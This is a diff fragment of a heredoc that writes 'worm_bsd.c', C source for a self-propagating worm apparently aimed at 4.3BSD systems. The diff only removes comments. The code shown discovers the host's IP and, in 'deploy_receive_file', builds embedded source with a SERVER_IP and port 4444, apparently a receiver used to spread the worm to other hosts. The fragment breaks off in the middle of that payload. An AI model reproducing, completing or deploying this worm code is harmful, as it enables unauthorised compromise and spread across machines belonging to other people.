@@ -9,13 +9,13 @@ cat > worm_bsd.c << 'EOF'
 #define HOSTS_FILE "/etc/hosts"
 #define MAX_IP_LEN 64
 
-/* K&R Style function definition */
+
 void get_local_ip(ip)
     char *ip;
 {
     int sock;
     struct sockaddr_in serv_addr, local_addr;
-    int len; /* socklen_t did not exist, use int */
+    int len;
     len = sizeof(local_addr);
 
     printf("[*] Getting local IP\n");
@@ -26,11 +26,9 @@ void get_local_ip(ip)
         return;
     }
 
-    /* 4.3BSD uses bzero instead of memset */
     bzero((char *)&serv_addr, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(53);
-    /* inet_pton did not exist, use inet_addr */
     serv_addr.sin_addr.s_addr = inet_addr("8.8.8.8");
 
     if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
@@ -45,7 +43,6 @@ void get_local_ip(ip)
         return;
     }
 
-    /* inet_ntoa returns a pointer to a static string */
     strcpy(ip, inet_ntoa(local_addr.sin_addr));
     close(sock);
 }
@@ -63,7 +60,6 @@ void deploy_receive_file(sock, my_ip)
     formatted_source = (char *)malloc(10000); 
     if (formatted_source == (char *)0) return;
 
-    /* Old C does not support const; using standard char pointer */
     file_contents = "#include <stdio.h>\n#include <sys/types.h>\n\
 #include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n\
 #define SERVER_IP \"%s\"\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\
